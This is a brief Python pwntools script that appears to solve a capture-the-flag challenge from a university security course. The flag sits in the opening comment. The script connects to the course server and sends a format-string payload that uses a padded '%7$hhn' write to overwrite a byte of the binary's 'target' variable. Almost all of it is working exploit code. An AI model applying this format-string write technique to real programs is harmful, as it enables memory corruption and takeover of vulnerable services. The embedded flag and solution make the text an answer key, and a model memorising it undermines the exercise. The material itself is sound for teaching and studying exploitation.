# SSof{And_write_very_big_numbers}
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22194

elf = ELF("bin")
target_address = elf.symbols['target']

### run a remote process
s = remote(SERVER, PORT, timeout=9999)
# s = process('./check', shell=True)


### interact with it
# using nm: target addr: 0804a040
print(p32(target_address+2))
target = p32(target_address+3)
padding = str(0xff-len(target))
print(padding)
msg = target+b"%0"+ bytes(padding, "utf-8") + b"x"
# msg = target+b"%0" + b"x"
# msg = target+b"%08x."*7
msg += b"%7$hhn"
print(msg)
# s.send(msg + b'\n')
s.sendline(msg)

print(s.recv())
# s.recvall()
# s.interactive()

